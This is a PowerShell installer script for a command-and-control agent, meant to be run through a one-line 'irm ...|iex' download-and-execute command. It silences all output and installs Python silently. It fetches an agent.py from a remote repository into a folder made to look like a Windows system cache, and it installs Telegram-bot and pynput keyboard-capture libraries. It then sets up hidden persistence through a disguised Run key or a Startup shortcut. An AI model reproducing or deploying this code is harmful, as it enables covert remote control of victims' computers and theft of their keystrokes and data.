<#
.SYNOPSIS
    C2 Node Agent - Quiet user-level installer (no elevation)

.DESCRIPTION
    Installs under the current user only (HKCU Run).
    Prints "..." while running, then "[]" when finished.
    No param() block — required for reliable irm|iex.

.EXAMPLE
    powershell "irm c.xrorx.com|iex"
    irm c.xrorx.com|iex
#>

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"

$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"

Write-Host "..."

try {
    $procs = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and
        ($_.CommandLine -like "*agent.py*")
    }
    foreach ($p in @($procs)) {
        Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
    }

    Get-ScheduledTask -ErrorAction SilentlyContinue |
        Where-Object { $_.TaskName -like "*C2Agent*" } |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue

    $pythonPath = $null
    if (Get-Command "python" -ErrorAction SilentlyContinue) {
        $pythonPath = (Get-Command "python").Source
    }

    if (-not $pythonPath) {
        try {
            winget install Python.Python.3.12 `
                --accept-source-agreements `
                --accept-package-agreements `
                --silent `
                --disable-interactivity 2>&1 | Out-Null

            $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "User")
            $pythonPath = (Get-Command "python" -ErrorAction SilentlyContinue).Source
        } catch {}
    }

    if (-not $pythonPath) {
        Write-Host "[]"
        return
    }

    $pythonDir = Split-Path $pythonPath
    $pythonwPath = Join-Path $pythonDir "pythonw.exe"
    if (-not (Test-Path $pythonwPath)) { $pythonwPath = $pythonPath }

    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }

    $agentPyPath = Join-Path $InstallPath "agent.py"
    if (-not (Test-Path $agentPyPath)) {
        try {
            $downloadUrl = "https://raw.githubusercontent.com/zen-zecode/c2/main/node/agent.py"
            Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
        } catch {
            @"
# C2 Agent - Placeholder
import time
while True: time.sleep(60)
"@ | Set-Content -Path $agentPyPath -Encoding UTF8
        }
    }

    $venvPath = Join-Path $InstallPath "venv"
    $pyvenvCfg = Join-Path $venvPath "pyvenv.cfg"
    if (-not (Test-Path $pyvenvCfg)) {
        if (Test-Path $venvPath) {
            Remove-Item $venvPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        & $pythonPath -m venv $venvPath 2>&1 | Out-Null
    }
    if (-not (Test-Path $pyvenvCfg)) {
        Write-Host "[]"
        return
    }

    $venvPython = Join-Path $venvPath "Scripts\python.exe"
    $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"

    $reqFile = Join-Path $InstallPath "requirements.txt"
    @"
python-telegram-bot>=21.0
httpx>=0.27.0
pynput>=1.7.0
"@ | Set-Content -Path $reqFile -Encoding UTF8

    & $venvPython -m pip install uv --quiet --disable-pip-version-check 2>&1 | Out-Null
    $uvExe = Join-Path $venvPath "Scripts\uv.exe"
    & $uvExe pip install -r $reqFile --python $venvPython --quiet 2>&1 | Out-Null

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "MicrosoftWindowsCache"
    $cmd = "cmd /c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""

    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $cmd -ErrorAction Stop
    } catch {
        $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2Update.lnk"
        $wsh = New-Object -ComObject WScript.Shell
        $sh = $wsh.CreateShortcut($shortcutPath)
        $sh.TargetPath = "cmd.exe"
        $sh.Arguments = "/c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""
        $sh.WindowStyle = 7
        $sh.Save()
    }

    Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" `
        -WorkingDirectory $venvPath -WindowStyle Hidden
} catch {}

Write-Host "[]"
